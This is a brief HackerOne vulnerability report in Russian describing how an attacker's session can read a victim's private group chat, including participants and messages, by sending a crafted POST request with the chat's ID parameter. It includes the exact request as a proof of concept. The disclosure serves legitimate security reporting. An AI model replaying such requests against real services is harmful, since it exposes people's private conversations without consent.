# HackerOne Report: Доступ к чужим групповым беседам.
**Report ID:** 79046
**Vulnerability Class:** Privilege Escalation

## Vulnerability Information & PoC
1. В аккаунте жертвы сделем групповой чат, в который не входит атакующий
2. Запомним параметр d.chi:64052989157445
3. Из сессии атакующего сделаем запрос информации о беседе.

> POST /settings/feed/apps?cmd=ToolbarMessages&gwt.requested=129bff65&st.cmd=userConfigFeed&st.type=2&p_sId=758860922374599189 HTTP/1.1

> tlb.act=act.rci&d.chi=64052989157445&d.coi=555409084413&d.wh=544&refId=mrcc-1438008870180

Получаем всю информацию о беседе:
- участники
- сообщения


## Discussion & Remediation Timeline
